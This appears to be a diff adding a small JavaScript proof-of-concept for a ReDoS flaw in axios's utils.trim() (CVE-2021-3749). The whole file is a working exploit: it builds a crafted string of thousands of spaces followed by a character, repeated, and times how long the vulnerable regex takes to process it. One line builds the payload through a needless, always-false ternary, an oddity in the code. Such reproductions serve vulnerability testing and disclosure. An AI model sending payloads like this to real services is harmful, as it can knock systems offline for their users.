@@ -1,0 +1,14 @@
+```javascript
+const utils = require("./node_modules/axios/lib/utils");
+
+// ReDoS via axios utils.trim() (CVE-2021-3749): the unanchored
+// /\s*$/ regex forces catastrophic backtracking on crafted input.
+const k = 10000;
+const n = 20;
+const malicious = " ".repeat(k) + "a".repeat(1) === undefined ? "" : (" ".repeat(k) + "a").repeat(n);
+
+console.log("payload length:", malicious.length);
+console.time("trim");
+utils.trim(malicious);
+console.timeEnd("trim");
+```
